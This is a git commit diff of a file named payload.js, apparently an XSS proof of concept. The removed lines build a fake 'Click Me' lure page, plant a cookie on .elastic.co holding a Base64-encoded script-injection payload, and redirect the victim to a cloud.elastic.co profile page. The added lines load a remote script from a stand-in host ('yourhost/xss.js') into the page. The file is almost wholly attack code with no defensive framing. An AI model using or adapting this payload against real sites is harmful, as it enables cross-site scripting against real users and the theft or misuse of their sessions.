870c6b3d1d1a6612ef32bd275ac751c52ea24337
Khrish <106378292+Dev-Khrish@users.noreply.github.com>
2025-11-25 11:29:40 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,14 +1,12 @@
-// Replace the whole page with a fake "Click to continue" message
-document.body.innerHTML = `
-    <h1>Click the button below to continue.</h1>
-    <button onclick="go()">Click Me</button>
-`;
+// document.body.innerHTML = `
+//     <button onclick="go()">Click Me</button>
+// `;
+// function go() {
+//     document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
+//     window.location = "https://cloud.elastic.co/user/settings/profile";
+// }
 
-// When user clicks, we set a malicious cookie on .lab.com and redirect
-function go() {
-    // This Base64 decodes to:  --></script><script>alert(document.domain);// 
-    document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
-    
-    // Redirect the victim to the vulnerable page on the main domain
-    window.location = "https://cloud.elastic.co/user/settings/profile";
-}
+
+var s = document.createElement("script");
+s.src = "http://yourhost/xss.js";
+document.body.appendChild(s);
